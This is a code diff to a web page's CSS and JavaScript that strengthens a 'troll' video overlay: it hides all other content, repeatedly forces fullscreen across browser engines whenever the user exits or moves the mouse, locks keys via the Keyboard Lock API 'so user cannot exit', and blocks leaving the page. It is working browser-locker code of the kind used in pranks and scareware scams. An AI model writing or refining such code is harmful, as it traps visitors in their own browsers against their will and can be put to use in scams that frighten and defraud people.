@@ -228,6 +228,9 @@ body.troll-active {
   height:100vh !important;
   width:100vw !important;
 }
+body.troll-active > *:not(#vid-overlay) {
+  display:none !important;
+}
 </style>
 </head>
 <body>
@@ -871,14 +874,17 @@ vid.addEventListener('ended', () => {
 // Force fullscreen helper
 function forceFullscreen() {
   if (overlay.style.display !== 'block') return;
-  const el = overlay;
-  const rfs = el.requestFullscreen || el.webkitRequestFullscreen
-            || el.mozRequestFullScreen || el.msRequestFullscreen;
-  if (rfs && !document.fullscreenElement) {
-    try {
-      const p = rfs.call(el);
-      if (p && p.catch) p.catch(() => {});
-    } catch(e) {}
+  const isFs = document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement;
+  if (!isFs) {
+    const el = overlay;
+    const rfs = el.requestFullscreen || el.mozRequestFullScreen
+              || el.webkitRequestFullscreen || el.msRequestFullscreen;
+    if (rfs) {
+      try {
+        const p = rfs.call(el);
+        if (p && p.catch) p.catch(() => {});
+      } catch(e) {}
+    }
   }
   // Keyboard Lock API (Chrome/Edge): captures ESC and system keys so user cannot exit
   if (navigator.keyboard && navigator.keyboard.lock) {
@@ -905,26 +911,28 @@ document.addEventListener('keydown', e => {
   }, 10);
 }, true);
 
-// Re-fullscreen on any user gesture or escape event
-['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(ev => {
+// Re-fullscreen on any fullscreen change event across all browser engines
+['fullscreenchange', 'mozfullscreenchange', 'webkitfullscreenchange', 'MSFullscreenChange'].forEach(ev => {
   document.addEventListener(ev, () => {
-    if (!document.fullscreenElement && overlay.style.display === 'block') {
+    const isFs = document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement;
+    if (!isFs && overlay.style.display === 'block') {
       forceFullscreen();
-      setTimeout(forceFullscreen, 50);
-      setTimeout(forceFullscreen, 150);
+      setTimeout(forceFullscreen, 20);
+      setTimeout(forceFullscreen, 100);
+      setTimeout(forceFullscreen, 300);
     }
   });
 });
 
-// Re-snap to fullscreen instantly on any mouse/pointer activity
-window.addEventListener('click', forceFullscreen, true);
-window.addEventListener('mousedown', forceFullscreen, true);
-window.addEventListener('pointerdown', forceFullscreen, true);
-window.addEventListener('mousemove', () => {
-  if (overlay.style.display === 'block' && !document.fullscreenElement) {
-    forceFullscreen();
-  }
-}, true);
+// Re-snap to fullscreen instantly on any mouse/pointer activity in Firefox and other engines
+['click', 'mousedown', 'mouseup', 'pointerdown', 'pointerup', 'mousemove'].forEach(ev => {
+  window.addEventListener(ev, () => {
+    if (overlay.style.display === 'block') {
+      const isFs = document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement;
+      if (!isFs) forceFullscreen();
+    }
+  }, true);
+});
 
 // Prevent navigating away or closing without warning
 window.addEventListener('beforeunload', (e) => {
